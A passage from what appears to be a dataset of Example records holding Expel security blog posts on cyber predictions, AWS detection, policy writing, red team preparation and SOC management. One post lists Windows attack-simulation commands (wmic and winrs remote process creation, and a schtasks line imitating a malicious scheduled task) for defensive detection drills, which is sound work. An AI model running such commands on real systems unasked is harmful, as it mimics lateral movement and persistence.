Kubernetes authentication, youre ready to start injecting vault agents onto tenant application pods so they can access the vault using short-lived tokens. But this is a subject for a future post. Are you cloud native? At Expel, were on a journey to adopt zero trust workflows across all layers of our cloud infrastructure. With Hashicorp Vault, were able to introduce these workflows when accessing application secrets or allowing dynamic access to infrastructure resources. We also love to protect cloud native infrastructure. But getting a handle of your infrastructures security observability is easier said than done. Thats why we look to our bots and tech to improve productivity. Weve created a platform that helps you triage Amazon Web Services (AWS) alerts with automation. So, in addition to these best practices, I want to share an opportunity to explore this product for yourself and see how it works. Its called Workbench for Engineers, and you can get a free two-week trial here. Check it out and let us know what you think!'}) (input_keys={'title'}),
  Example({'title': '5 cybersecurity predictions for 2023', 'url': 'https://expel.com/blog/5-cybersecurity-predictions-for-2023/', 'date': 'Dec 21, 2022', 'contents': 'Subscribe  EXPEL BLOG 5 cybersecurity predictions for 2023 Expel insider  3 MIN READ  DAVE MERKEL, GREG NOTCH, MATT PETERS AND CHRIS WAYNFORTH  DEC 21, 2022  TAGS: Cloud security / MDR Its that magical time of year when security folks dust off their crystal balls and do their best to gaze into the futurehazarding a (well-informed) guess at whats on the horizon for cybersecurity in 2023. A few leaders on the Expel team took some time to reflect on learnings from this yearfrom our own customers and the broader security communityto share what they think is next for the industry in the new year. Here are their thoughts. 1. The cyber-insurance industry is ripe for disruption. Cyber insurance is an expensive, complex, and difficult necessity in the cybersecurity industry. Its rapidly becoming a more expensive line item in a Chief Information Security Officers (CISOs) budget, and we can expect new and innovative approaches to risk assessment to emerge. As companies look to secure cyber insurance, theyll apply additional pressure on their supply chain to provide demonstrable proof that their downstream suppliers are able to respond effectively and in near real-time to cyber incidentsincidents that have the potential to affect the companys own response (like when Toyota halted production following an attack on a supplier earlier this year).  Chris Waynforth, General Manager, EMEA 2. Everything old is new again, as attackers bypass MFA by targeting the user. Since secure by default configurations have become more common, were going to see attackers investing more of their time targeting the user. Our security operations center (SOC) saw this trend in the third quarter (Q3) of 2023, as users increasingly let attackers in by approving fraudulent multi-factor authentication (MFA) pushes to enact business application compromise (BAC) attacks. In fact, MFA and conditional access were configured for more than 80% of the cases where the attackers were successful in Q3. (More on this in our quarterly threat report recap for Q3.) In theory, none of these hacks should have succeeded, but the attacker tricked users into satisfying the request by hitting them with a barrage of MFA notifications until they eventually accepted one. For some organizations, this shift in attacker strategy will drive adoption of technologies like Fast Identity Online (FIDO). For others, especially those that struggled to implement MFA in the first place, it wont. For those companies that do button up effectively, attackers will turn back to targeting the infrastructure and applications.  Matt Peters, Chief Product Officer 3. CISOs will have to learn to frame security risk as a business factor. Company boards are having broader conversations around risk and as a result, security leaders will need to translate risk into business outcomes enabled by security investment. As macroeconomic conditions drive changing priorities, security leaders will need to adopt a more framework-based approach to demonstrate return on investment (ROI) for their boards. Security leaders unable to make the connection to business outcomes will struggle career-wise, struggle for budget, and struggle for relevance in the business decision-making processes of their organization.  Dave Merkel, Chief Executive Officer, Co-founder 4. Macroeconomic impacts will force companies to scrutinize security spend. For many security leaders, the changing macroeconomic climate will shift the focus toward cost-conscious decisions and the consolidation of cybersecurity investments. Until now, companies have taken a more is more approach to cybersecurity products and services, tacking on tools to their arsenals to combat the growing threat landscape. But next year, theyll face tighter budgets and the need to prioritize. This consolidation can be a good thing, as it will force focus on quality outcomes, and a move away from the model of loosely integrated solutions that simply deliver more alerts. Companies have increasingly turned to managed detection and response (MDR) providers to help manage this, and that trend is only going to continue. Many security leaders recognize it can be more effective and economical to optimize their operations with outside experts. For those that do continue to handle this internally, theyll be pressured to drive cost efficiency, and with greater urgency than in previous years.  Greg Notch, Chief Information Security Officer 5. The available cybersecurity talent pool is about to get a lot bigger. As tech companies are forced to enact layoffs because of the macroeconomic climate, more professionals with technical skills will enter the job market. For companies fortunate enough to still be in the position to hire, this will present a unique opportunity to select from an increased talent pool of skilled technical workersat a time when the cybersecurity skills gap still makes the headlines daily. Not to mention, the diversity that comes from an expanded hiring pool leads to organizations that are more successful at attracting and retaining employees.  Dave Merkel, Chief Executive Officer, Co-founder At the beginning of this year, we took a deep dive into the data our SOC ingested from the previous year to predict what was in store for 2022 with our first-ever Great eXpeltations annual report. Keep an eye out for the next iteration of this report, full of year-end analysis and predictions like these, coming in January 2023.'}) (input_keys={'title'}),
  Example({'title': '5 pro tips for detecting in AWS', 'url': 'https://expel.com/blog/5-pro-tips-for-detecting-in-aws/', 'date': 'Feb 15, 2022', 'contents': 'Subscribe  EXPEL BLOG 5 pro tips for detecting in AWS Tips  3 MIN READ  BRANDON DOSSANTOS, BRITTON MANAHAN, SAM LIPTON, IAN COOPER AND CHRISTOPHER VANTINE  FEB 15, 2022  TAGS: Cloud security / MDR / Tech tools Detection and response in a cloud infrastructure is, in one word: confusing. And untangling the web of Amazon Web Services (AWS) can be daunting, even for the most experienced among us. So where do you start? Sometimes better security practices begin with basic, but critical, changes. In this post, well walk you through five pro tips for threat detection in AWS so you can free yourself from a bunch of alerts and get the space back to focus on the alerts that matter most. Prioritize security as part of your culture like, yesterday News flash: your security team shouldnt be the only people concerned about security  just ask your colleague that fell for yet another phishing scam. If you want a security program that works, it needs to be ingrained into all parts of your business and culture. That means educating all of your users so they understand security best practices, and keeping these best practices fresh in their minds with consistent, office-wide trainings. When security is baked into your culture, frameworks, and solutions, it becomes a day-to-day priority. Set goals along the way to see what does and doesnt work for your org. Changing the way employees think and feel about security might be an incremental process, and thats okay! At the end of the day, every employee should at least understand the importance of security, and your Chief Information Security Officer (CISO) should always have a seat at the table. Giving your CISO insight into business decisions upfront helps keep security a top line priority for your whole org from the beginning, so that youre not playing catch-up down the line. Forget what you know about normal Whats normal anyway  right? Every AWS environment is unique, which means whats usual in one environment can be suspicious in another. Before you can automate or write detections, you need to know whats exposed to the outside world in your cloud environment, take a serious look at container security, and understand what normal looks like in your environment. If you spot unusual user or role behavior, dig deeper. Look at it through a wider lens over the past 24 hours. Does anything look interesting, like multiple failed API calls? Understanding whats the norm in your environment helps you efficiently tune alerts (and helps tune out that security engineer whos constantly running penetration tests). Automate, automate, automate Automating elements of your security program helps with consistency, but do it strategically. Start by asking, What problem are we trying to solve? and work from there to free up resources and speed up time-to-detect. All AWS services are available as APIs, so you can automate just about anything. Know which servers are mission critical and use automation to adjust those alerts for impact so your team doesnt miss anything. Not to mention, it might help your security team sleep through the night without waking up in a cold-sweat because an alert slipped through the cracks. Lean on logging for better context clues Its hard to tell a story and determine what happened if theres no [cloud]trail to follow. Your detections are only as good as your logging. Make sure CloudTrail is logging all of your accounts, not just certain regions, and that no one is tampering with your logging (like turning it off entirely  yikes). Then, use CloudTrail as an events source to find anomalous or aggressive API usage. We recommend linking MITRE ATT&amp;CK tactics with AWS APIs to filter for the most interesting activity. By the way, heres a mind map for AWS investigations that lays out some preliminary tactic mapping to make this part easier. Take your time laying the breadcrumbs (re: make sure your logging is up to par). It helps your detections and ultimately speeds up triage and investigation after your team sees an alert. Get back to the basics We get it  for an industry vet, it can be easy to overlook the basics. But when misconfigurations are a leading vector behind attacks in the cloud, its important to make sure youre brushing up on best security practices in your AWS environment. It sounds simple, but the best way to understand AWS to write detections  and the key to red team research  is learning the basics of Identity and Access Management (IAM). Similarly, when thinking about container security, make sure youre securing every point an attacker can infiltrate. Covering the basics, from IAM to parts of a container, helps you protect your environment and improve your detection writing. See? Simple. Want to know more about some or all of these tips? We did a deep dive into these tips and all things detecting in AWS during Expels AWS Detection Day. You can check out each of our session videos here . Still have questions? Wed love to chat!'}) (input_keys={'title'}),
  Example({'title': "5 tips for writing a cybersecurity policy that doesn't suck", 'url': 'https://expel.com/blog/5-tips-writing-cybersecurity-policy-doesnt-suck/', 'date': 'Sep 17, 2019', 'contents': 'Subscribe  EXPEL BLOG 5 tips for writing a cybersecurity policy that doesnt suck Tips  4 MIN READ  JOHN LAWRENCE  SEP 17, 2019  TAGS: CISO / Framework / How to / Planning Ask anyone whos worked in cybersecurity for any length of time and Ill bet you theyve been asked to draft or contribute to a cybersecurity policy for their org. Creating a policy sounds simple, but those same people whove been tapped to contribute will tell you that its not easy. Thats because enterprise-level cybersecurity policy is still a new thing and with new things comes many different interpretations and implementations. Its also not always easy for policy writers to work with other teams to find that sweet spot where security needs and business needs are balanced  and without slowing employees down, of course. But drafting a comprehensive cybersecurity policy is critical for enforcing guidelines and reducing liability. Here are some pro tips on what goes into a good cybersecurity policy and how you might use these tips in your own org. What does policy really mean? Before putting pen to paper, youve gotta understand what policy means in the first place. There are lots of terms that get tossed around when a policy is being created, but theyre not interchangeable (even though some people use them that way). Here are a couple terms you might hear during a discussion about policy, along with their definitions: Term Definition Policy What it is: A plan or course of action to guide future decisions. What it answers: What to do and why to do it. Procedure What it is: Describes the exact steps for a policy to be executed. What it answers: Who does what, when they do it, how they do it and what to do specifically. Audit What it is: Measures against a set standard. An objective measurement of security. Common standards include NIST , PCI, IEC 62443. What it answers: Are we meeting our goals? Are we following our policies? Assessment What it is: Measures against the experience of others. A subjective measurement of security. What it answers: Does it seem like we are meeting our goals? How do we feel about how the policy is being followed? Now that weve got the basic definitions out of the way, Ill use them in an example to see how they might actually be used in a conversation about your own orgs policy: Were creating a new cybersecurity policy for the company. This policy will outline goals to guide us in our most important cybersecurity tasks. The policy will state that well conduct an assessment every three months to verify employees are following policy and procedure and an audit every year to ensure that were meeting PCI compliance . Further, procedures will be made to provide guidelines and steps on accomplishing the goals set forth by the policy. Pro tips for writing a policy that doesnt suck The Valve Employee Handbook , Microsoft Standards of Business Conduct and even the US Constitution  all of these works come from large organizations and at their core is strong policy writing. What are some of the most important rules of policy writing these works use that we can use as were doing our own drafting? The stuff you decide to include in your cybersecurity policy will be unique to your org  and companies needs when it comes to cybersecurity vary so widely that we cant try and cram all of those nuances into a single blog post. But all good cybersecurity policies do share some similar traits. After chatting with lots of Expletives whove written and contributed to countless policies over the course of their careers, heres the final list of pro tips we came up with to help you as youre drafting your own: Know your business goals. Sounds obvious, but its always good to gut check the direction of your policy against the broader business goals. If youre not aligned with the same stuff the business cares about, you run the risk of cybersecurity being seen as a cost center or deadweight on the company  not exactly a position you want to be in. Michael Sutton goes into greater depth here on how to create or grow relationships with the other execs on your team so that youre all on the same page when it comes to goals. Make it practical. Of course you want to create the ideal policy  but make sure the guidelines youre creating are realistic for both your users and your own security team (if youre lucky enough to have one). A common example of an impractical policy is one that includes lots of mandates around sensitive data protection. In these policies, orgs might say things like all confidential data must be marked and all external transmission of data must be encrypted. Sure, it sounds good on paper, but your users wont do this because its a headache for them to do manually. Instead, you could ask employees to only mark the data when its leaving your org, and then have tech in place to do the secure transfer automatically. Setting realistic expectations for users and your own team gives you a much better chance that the rules you set forth will be followed. Make it applicable. Make sure the policy youre writing is applicable to your org. For example, every so often a policy will get caught up covering too many specific security examples and how to resolve them. This turns the policy from a document providing direction to a document thats applicable in only a few specific circumstances. And when a policy is not always applicable people start to ignore it. Be concise. Youre not drafting the Magna Carta here. Keep the policy short and to the point so that employees will actually read it. Theres sometimes a tendency to include a bunch of boilerplate language that all policies must have  but dont do that. The longer the policy, the less likely your users are to internalize it. Write in plain English. All of us cybersecurity folks love speaking in APTs, CVEs, XSS, and LEET (sometimes). But remember that Mike in finance and Karen in sales dont speak cybersecurity. Write your policy in everyday language so that anyone in your org  regardless of their knowledge level about cyber threats  can understand it. Got a draft? Here are your next steps Once youve got a draft of your policy, a great way to determine whether your policy passes the sniff test in the five areas mentioned above is to share it with others and ask for feedback. (Bonus: This is a great way to socialize the policy with your executive team and make some new friends.) There are also numerous resources you can review as youre drafting your policy that might help you get a better understanding of what a policy should and shouldnt cover  take a look at NATO CCDCOE (NATO Cooperative Cyber Defence Centre of Excellence), NCCoE (National Cybersecurity Center of Excellence) or the NIST CSF (National Institute of Standard and Technology Cybersecurity Framework) for starters. With that, youre well on your way to becoming the policy whiz kid of the office  dont let it all go to your head. John Lawrence is a Security Operations Center intern at Expel. Check out his LinkedIn profile .'}) (input_keys={'title'}),
  Example({'title': '6 things to do before you bring in a red team', 'url': 'https://expel.com/blog/6-things-to-do-before-you-bring-in-red-team/', 'date': 'Jul 8, 2020', 'contents': 'Subscribe  EXPEL BLOG 6 things to do before you bring in a red team Tips  6 MIN READ  JON HENCINSKI, TYLER FORNES AND DAVID BLANTON  JUL 8, 2020  TAGS: How to / Managed detection and response / Managed security / Planning / SOC Remember that time we almost brought down our point of sale environment on a busy holiday weekend because we thought the red team was a real bad guy? Whoah, that wouldve been bad. But we didnt because we did our prep work. The SOC had a bat phone to the red team and was able to quickly verify the evil  whoami  and  net  commands were from the red team. Crisis averted. Red team assessments are a great way to understand your detection and investigative capabilities, and stress test your Incident Response (IR) plan . But good intentions can lead to bad outcomes if you dont do your prep work. A red team will generate activity that looks similar to a targeted attack (cue the adrenaline). So a little planning goes a long way. Heres six things you should do before taking on the red team. 1. Start with objectives Start here. Get clear on your objective(s) to set the direction of the assessment and define the rules of engagement. Worried that an attacker could gain access to a segmented part of your network? Or perhaps youre worried that an attacker could compromise credentials and spin up resources in Amazon Web Services (AWS)? Clear objectives help everyone. Business-focused objectives usually look like: Break into a segmented part of your network Obtain a VIP users credentials (CEO, CTO, IT Administrator, etc.) Access/exfiltrate customer data While these drive the overall theme and end-game for the red team, theres a set of objectives that often surround the organizations ability to respond as well. From a defensive perspective some reasonable objectives are: Assess detection capabilities and identify gaps Stress test response and remediation capabilities Assess investigative capabilities in Windows and Linux environments Assess investigative capability in the cloud Goals bring purpose to the assessment. Purpose that should be measured along the way. Some key questions we measure are: How long did it take us to spot the red team? At what phase in the attack lifecycle did we spot them? How long did it take us to remediate? What challenges did we encounter when remediating? Do we need to update our response playbooks? What didnt we detect? Document these to be actioned later. Were there investigative challenges that prevented us from answering key questions? Document these to be actioned later. 2. Review your IR plan with the team Its so important to build muscle memory around your IR process before a bad thing happens. This way everyone knows what to do, including how to communicate. One of the biggest challenges is getting over the adrenaline rush that comes with responding to an incident. Panic will happen, and chaos will ensue the first couple of times through it. But as everyone gets comfortable with the process and goes through some of the unknowns together, the response process will become a well-oiled machine that everyone is ready for instead of afraid of. From an operators perspective, were a huge fan of running threat emulations for our analysts. These are miniature versions of a red team assessment that help train our analysts in responding to a specific threat, or testing our own response process. Theres a lot of fun to be had here for a blue-teamer who is red curious (remember rule #1 is that objectives are key). For the broader org, were biased, but  Oh Noes  is a great place to start if you need some help organizing a simulated walk-through of your IR plan (and have some fun in the process). 3. Emphasize remediation We agree with Tim MalcomVetter . The emphasis of a red team should be response. Talk about remediation ahead of time. Ask hard questions like, what would we do if that account was compromised? Pro-tip: Know ahead of time who in your org to contact for infrastructure questions, service accounts, etc. Sometimes knowing who to call is the biggest hurdle. Plan your response, know who to contact, and then stress test your plans. If your SOC doesnt have a lot of reps responding to red team activity, remediation may happen without considering business impact. Consider the following: The red team appears to be using the account sql_boss to move laterally. We should disable that account. Red teams love service accounts. Service accounts typically have privileged access and can be tough to reset. In this scenario, disabling the account  sql_boss  would cause the red team some pain. But what else would it do? What does that account run? How is it used? Is it responsible for the backend of a business critical application? Should we disable this account? Can we disable this account right now? Theres some not-so-funny stories we can tell here about how this oversight has caused major pain for some organizations. But in essence the major theme is: Do your homework, plan your response and talk about it ahead of time. 4. Set expectations Your blue team just spotted a bad guy moving laterally via WMI to dump credentials on a server? Great find! Will you let them know its an authorized red team? Theres many theories to appropriately assess the response to a red team. Some organizations prefer not to tell their defenders, some prefer to operate more openly in the purple team model. In any regard, there will be a moment between detection of the initial threat and the recognition that this is authorized red team activity that youll want to plan for. Your SOC will think this is a real threat, and your playbooks for a real threat will (hopefully) be followed. Consider that when you make the decision to include/exclude knowledge of the assessment from key stakeholders in your security organization. One way to think about this is: at 2am who/how many will be woken up to respond, and how soon in our IR plan do things become a risk to the business? Our take: The more people in the know, the better. Dont gas the team responding to an authorized assessment. Save some capacity and energy for the real thing (weve seen the real thing happen at the same time as the assessment). 5. Chat with your MSSP/MDR Use an MSSP or MDR? Chat with them. Understand rules of the road for responding to red team activity. Its likely one of your red team goals includes assessing your MSSP/MDR. Thats great! But understand what you can expect before you get started. At Expel, we like to treat red team engagements as a real threat to exercise our analysts investigative muscle, and also showcase our response process. This helps build confidence between us and our customers. It also helps them understand how we will communicate with them (slack, email, PagerDuty) when theres an incident in their environment. Additionally, this also showcases our analysts investigative mindset, including a full report to show the detail of our response and the thoroughness of our investigation. Now, as mentioned above theres a cost to responding to a red team exercise. Response is time-consuming and analyst resources are extremely valuable. We believe that showcasing the initial response is important, and the extended response can wait. That means if a red team is detected and confirmed at 2am, let everyone go back to bed and pick up the response during normal business hours. For red team response, we operate M-F 9am-5pm and will continue to chase new leads for two business days before delivering a final report. That report is comprehensive, and includes everything our normal critical response would contain, but everyone is much happier at the end of the day when our off-hour energy is saved for the real thing. 6. Have a bat phone to the red team Your MDR or SOC just spotted activity they believe is the red team. Prove it with evidence. Dont assume! Call them. Show them. Verify its the red team using evidence. You would be surprised at how often the lines get crossed when the actions taken during an assessment dont necessarily line up with what was documented/in-scope. However, the quicker these actions can be confirmed, the happier everyone is when they arent related to the actions of an actual threat. Most SOCs will not stand down until this is confirmed, and weve sometimes waited more than 12 hours to get confirmation that something we identified is related to an authorized test. Thats a lot of energy expended on both ends. Have cell phone numbers, Zoom bridges, etc. before you get started. Always have a deconfliction process on-hand prior to launching the assessment. This will save a lot of your teams time and energy when the red team gets in. Parting thoughts Red team assessments come in all shapes and sizes, and we believe that they are essential for understanding not only the security posture of an organizations overall response readiness. If youre in a position to influence how a red team assessment is organized, we encourage you to talk about these points not only internally but with the red team you have chosen to carry out the assessment as well as the SOC/MSSP/MDR you will be relying on for defense. Some quick planning and expectation setting can prevent a lot of pain and create an overall better engagement for everyone involved!'}) (input_keys={'title'}),
  Example({'title': '7 habits of highly effective (remote) SOCs - Expel', 'url': 'https://expel.com/blog/seven-habits-highly-effective-remote-socs/', 'date': 'Mar 25, 2020', 'contents': 'Subscribe  EXPEL BLOG 7 habits of highly effective (remote) SOCs Security operations  5 MIN READ  JON HENCINSKI  MAR 25, 2020  TAGS: Employee retention / Managed detection and response / SOC Last week, along with many other businesses, we moved to 100 percent remote work as a company. That included our 247 SOC. Expels CEO and co-founder, Merk, shared his thoughts on some of the things he witnessed during our shift to an all remote workforce, but I wanted to share some of the changes we made to keep our SOC highly effective in this new setup. Security operations is a team sport at Expel. One of our SOC guiding principles is this: teamwork makes the dream work. Its simple: great outcomes happen when people work together . But as of last week, our SOC analysts are no longer sitting together. Its a change I knew that would require us to adapt a bit. Because in order to maintain the texture of the team in a completely remote setting wed need to commit to a new set of daily habits  seven in fact, to keep our (remote) SOC highly effective. To be candid: Its a big change for us and were still adjusting. You may be going through something similar right now too. Or you and your SOC team may consider yourselves veterans of an all-remote setting. Thats great too. Now were all in the same boat. Well share whats worked for us (so far) and wed love to hear whats worked for you too. 1. Prioritize video conferencing Workplace camaraderie and trust are key ingredients of an effective SOC. Trust brings safety and camaraderie adds a sense of togetherness. We trust each other to operate in the best interest of achieving our goal (protecting our customers and helping them improve) and to work with a were in this together mentality. We need to maintain and nurture these key ingredients in an all-remote setting. But how? Queue the SOC party line. The SOC party line is the name of our Zoom meeting thats open 247 for the team. Instead of walking onto the SOC floor, our analysts start their day by joining this Zoom meeting. While were no longer able to sit next to each other we can be with each other. It matters. Were emulating the texture of the SOC floor by staying connected via Zoom and maintaining our sense of togetherness. And yes, theres an endless pursuit to find a funny Zoom virtual background . (Side note: Security is serious business. We have the privilege of helping organizations manage risk. We take our work very seriously but dont take ourselves too seriously. Its okay to find the bad guys and have fun while doing it.) 2. When in pursuit: To the breakout room! While our 247 Zoom meeting, aka the SOC party line, emulates the SOC floor and brings us together, pursuing threats and coordinating response in this main Zoom meeting wouldnt yield the precise, coordinated response were seeking. Too many cooks in the kitchen. Instead, as work enters the system and the team spots activity that warrants investigation or follow-up, the lead investigator spins up a Zoom breakout room and invites the necessary resources required to run the item to ground. As an individual contributor youre provided with a virtual conference room with a clear goal and objective. As a manager, you have a clear understanding of current utilization based on the number of folks in the main Zoom room versus breakout rooms. Youre enabling a highly coordinated response and have a clear line of sight on capacity. A win-win. 3. Emphasize empathy Empathy is a core competency for leaders. I personally believe that no other skill makes a bigger difference than empathy when it comes to leadership. Simon Sinek agrees with me on this one. And now more than ever, during these stressful times, we need to emphasize empathy. Were all going through something significant right now. Its okay to acknowledge that and talk about it with one another. As a SOC management team, were spending more time with our people, not less. And most of our 1:1s right now are centered around how our folks are doing and what else we could be doing to set them up for success in this all-remote setting. We listen really hard and most importantly we let them know weve got their back. Pro tip: Empathy builds trust. And as you already know, trust is a key ingredient to an effective SOC. 4. Be transparent about quality Were doing everything we can to make our shift to a remote SOC seamless for the team. But were also being super transparent about the quality of our work output. Has our quality gone down as a result of this change? I wrote about our SOC quality program in a previous post , but as a quick recap: we use a quality control (QC) standard, Acceptable Quality Limits (AQL), to tell us how many alerts and incidents we should review each day. We then randomly select a number (based on AQL) of alerts, investigations and incidents and review them using a check sheet. We send the results to the team using a Slack workflow . Heres an example: Reviewing the results with the team lets us know how were doing. It lets us know where were having problems so we can adjust and improve. And no, we never expect perfection. 5. Over-communicate This one is a bit obvious but its worth stating. Since were no longer working alongside each other, effective communication is crucial. And working in an all-remote setup may mean more distractions for some folks, not less. Were emphasizing empathy and listening really hard to learn what these distractions are for the team and landed on the need to over-communicate . Repeat important messages in team meetings and 1:1s. In our SOC, I dont know or Im having difficulty understanding that is always an acceptable answer to a question (If youre not testing for candor in your interview process you totally should be, by the way). Bottom line: remote work may mean more distractions. Over-communicate like your team depends on it. 6. Seek out fun In these stressful times, not only is it okay to have fun  but you should seek it out for your team. Were still finding our way here a bit, but weve experimented with happy hours, coffee breaks and book clubs all over Zoom (dont worry, were always watching). The digital happy hour has been the biggest hit so far but were still coming up with new ideas. If you dont have Zoom, Skype, Google Hangouts, FaceTime and Facebook messenger are all good alternatives. Seeking out fun for your team is a great way to take care of them. Youll reduce stress and build camaraderie. 7. Test, learn, iterate Completely remote work may be our new normal for a while. Do I think the adjustments weve made are all of the right moves? Nope. But well continue to test new things, learn from our mistakes and iterate our way to an even more successful remote setup. Were never afraid to ask: Is there a better way to do this? Were always trying to learn and improve. Parting words Were still getting adjusted to our all-remote setup but weve landed on some things that work and wanted to share them with you. Well continue to learn and improve, as we always do, but Id love to hear from you if there are daily habits you and your team practice that make your remote SOC highly effective. Finally, were all going through something significant right now. Its okay to acknowledge that and talk about it. Emphasize empathy with your team and the people around you. Listen really hard. Prioritize effective communication. Over-communicate. And try to have a little fun while doing it.'}) (input_keys={'title'}),
  Example({'title': '7 habits of highly effective SOCs', 'url': 'https://expel.com/blog/7-habits-highly-effective-socs/', 'date': 'Nov 5, 2019', 'contents': 'Subscribe  EXPEL BLOG 7 habits of highly effective SOCs Talent  6 MIN READ  JON HENCINSKI  NOV 5, 2019  TAGS: Employee retention / Managed detection and response / Managed security / Planning / SOC Before I talk about effective SOCs that run like well-oiled machines, lets get one thing straight. SOC isnt a dirty word. But I totally understand the negative connotation and thats exactly why Im writing this post. Alert fatigue is real , repetition leads to exhaustion and those two things in tandem create an environment ripe for analyst burnout . I get it. Heres the thing: When built right, a job working in a SOC can be so much fun, not to mention you get the learning and experience you thought you signed up for. Since launching our 247 service almost two years ago weve experimented a ton, learned a bunch, and through a lot of iteration landed on some habits  seven, in fact  that we believe help us SOC the right way at Expel. If youre working in or managing a SOC with a ton of turnover  or just want tips on how to shape an effective and more productive team  here are seven habits to adopt right now. 1. Have a clear mission and guiding principles Get explicit about the mission and your culture. At Expel, the SOCs mission is to protect our customers and help them improve. The mission is centered around problem solving and being a strategic partner for our customers. Notice that there are zero mentions of looking at as many security blinky lights as possible. Thats intentional. Take it a step further and create some guiding principles. Guiding principles define what you as a team believe in and how you operate together. Here are some (but not all) of the guiding principles in the Expel SOC: Teamwork makes the dream work. Service with passion is our competitive advantage. We embrace positive change. Articulating guiding principles is the first step in creating a SOC culture that you can turn into your competitive advantage. Security tech and process are easily replicated but culture is hard to copy. 2. Prioritize learning Our analysts love to learn new things; its even one of the traits we hire for. One thing that weve learned in building out our program is that the best way to foster improvement is to combine this love of learning with a collaborative  not adversarial  approach. The best example of this is how we use attack simulations to help our team learn new techniques. During these, we have to celebrate progress and opportunities to learn  it doesnt take much to make someone feel foolish and have that metastasize into a reluctance to try a new thing or stretch a new skill. If you dont run attack simulations regularly, start building them into your schedule. But dont overthink it. You can run one right now in eight simple steps: Talk to the team and given them background so they dont feel ambushed. Open a PowerShell console. Run wmic /node:localhost process call create cmd.exe /c notepad from your PowerShell console to simulate remote process creation using WMI. Run winrs:localhost cmd.exe /c calc from your PowerShell console to simulate remote process creation using WinRm. Finally run schtasks /create /tn legit /sc daily /tr c:users &lt;user&gt;appdatalegit.exe to simulate the creation of a malicious Windows scheduled task. Interrogate your SIEM and EDR. Talk about it as a team. Find ways to improve. Want to run more sophisticated simulations? Heres our threat emulation framework along with an example of how to simulate an incident in AWS . 3. Empower the team Analysts want to spend time finding new things, pursuing quality leads and working with people to solve complex problems  not chasing the same false positive over and over again. Trust the team to filter out the noise and then enable them to do so. How did we build this capability at Expel? We took the DevOps processes used by our engineering teams and adapted them to detection deployment. Heres a high-level overview of what this looks like: We manage our detection rules using GitHub . We have unit tests for every detection (just like you would expect of code). We use CircleCi to build our detection packages. During the CircleCi build process, we apply linting and perform additional error checking. If a CircleCi build fails well automatically fail the PR so an analyst knows some additional tweaks are required. We create error codes that are easy to understand. We use Ansible to deploy new detection packages. Now an analyst can deploy a new detection package at any time as long as the content passes automated tests and has been peer-reviewed. Heres how this plays out in practice. @subtee just tweeted about a new remote process execution technique  An analyst creates the rule in GitHub and submits a new PR. That PR is picked up by CircleCi, linted and checked for errors. Assuming all goes well, the PR is marked as all checks passed. The analyst requests peer review. The detection package is deployed using Ansible. Everyones happy. Empower the team to tackle false positives and write rules to find new things. Give them control of the end-to-end system and back them up with good error checking. In doing so, your team members will feel more connected to their work and the mission. 4. Automate SOC work can be repetitive. Automation FTW! But what should you automate? Decision support is a great place to start. Whats decision support? In our context, decision support is all of the automation, contextual enrichment and user interface attributes that make our analysts more effective in answering the following question: Is this a thing? How does this play out at Expel? As part of our integration with Office 365 we collect signal and generate alerts when accounts are compromised or user activity doesnt seem quite right. Investigating patterns of user authentication behavior can be a tedious task when done manually  but the good news is that its a series of repeated steps that can be automated. Take a look at this example where, with the help of some automation, were able to quickly review 30 days of login activity based on IP address and user-agent combinations: Automate the repetitive tasks so the team can focus their efforts on making important decisions versus clicking buttons. 5. Use a capacity model Understand your available capacity (AKA analyst hours) and utilization. Are you consistently exceeding your available capacity? Is there always way more work to do than your people can handle? If so, cue the burnout. If capacity modeling is new to you, thats okay. There are plenty of resources available to help get you started. Bottom line: Know your capacity utilization. If you discover that your team is oversubscribed, youll need to act fast. 6. Perform time series analysis I agree with Yaneks philosophy here. Effective managers are able to look out into the future and, with reasonable certainty, predict what needs to change today . I think effective management is centered around asking the right questions and using data to answer them. You already know that alert fatigue leads to burnout. As a manager, I ask a ton of questions about the alert management process: How many alerts did we send to the team last month? How many alerts will we send to the team next month? What day of the week is the busiest? Do we get more alerts during the day or at night? How many alerts will we send to the team next year? All of these questions are centered around time . Time series analysis allows you to analyze data in order to learn what happened in the past, and to inform you on what things will likely look like in the future. By performing time series analysis you can forecast how things will change and react before its too late. We perform time series analysis on the historical volume of alerts sent to our team for triage. From this data, we pull out different components including trend , seasonality , and the noise AKA  the residual , so that we can use patterns from historical behavior to help us predict future behavior. This allows us to not only more deeply analyze whats already happened, but its also a way to look into the future so you can start to react now before its too late. 7. Measure quality I love this tweet. Quality control doesnt get in the way. It pushes you forward. At Expel, we use a quality control (QC) standard, Acceptable Quality Limits (AQL), to tell us how many alerts and incidents we should review each day. We then randomly select a number (based on AQL) of alerts, investigations and incidents and review them using a check sheet . QC allows us to spot problems, understand them and then fix them. And fast. Parting words Ill be candid. At one point I thought about rebranding our SOC as a Computer Incident Response Team (CIRT) to distance ourselves from all the general negativity associated with a SOC. But a SOC can be a great place to work if you solve problems the right way and empower your teams. As an industry, lets SOC the right way and reshape everyones thinking about SOCs.'}) (input_keys={'title'}),
  Example({'title': "A beginner's guide to getting started in cybersecurity", 'url': 'https://expel.com/blog/a-beginners-guide-to-getting-started-in-cybersecurity/', 'date': 'May 31, 2018', 'contents': 'Subscribe  EXPEL BLOG A beginners guide to getting started in cybersecurity Talent  9 MIN READ  YANEK KORFF, BEN BRIGIDA AND JON HENCINSKI  MAY 31, 2018  TAGS: Career / Guide / How to / NIST It happens from time to time. Someone tweets something incendiary, it creates a hubbub and before long youve got yourself a veritable online brouhaha. One topic that seems to have piqued everyones interest lately is this question: is there such a thing as an entry-level security job? Its a good one. And there seem to be two schools of thought: Never start off in security. Start with IT infrastructure, helpdesk, or development. Dont waste time, dive into security and fill in the technical gaps as you go. Here at Expel, we agree with Dinos philosophy . First of all, start anywhere you damn well want to start. Focus on what you want to do , versus what you want to be . Then, focus on finding the best place to do that and stay there. Weve seen it first hand. Weve hired several analysts straight out of college, and theyre doing excellent work (If youre an employer and not plugged into the community at the Rochester Institute of Technology , and specifically working with their Computer Security program, youre definitely missing out). So we know there are degree programs out there that will prepare you for security jobs right off the bat. Now that you know where we stand, weve got some tips on how to break into security . But there are lots of different jobs with the title security in them (and lots of jobs involving security that dont have security in the title) so itll be important to make sure we know which ones were talking about. Which cybersecurity jobs are we talking about? Wouldnt you know it, not only does NIST have a pretty great cybersecurity framework to help you manage risk , theyve also got another nice framework that can help job seekers figure out what employers are looking for. A good first step towards finding the work you want to do is to identify the tasks that float your boat and map them to jobs that give you the opportunity to do just that. Worried you dont have the technical depth for some of these roles? Entirely possible! If you drill into the framework a bit youll see some jobs (like Cyber Defense Analysis , which we call a SOC Analyst) have an 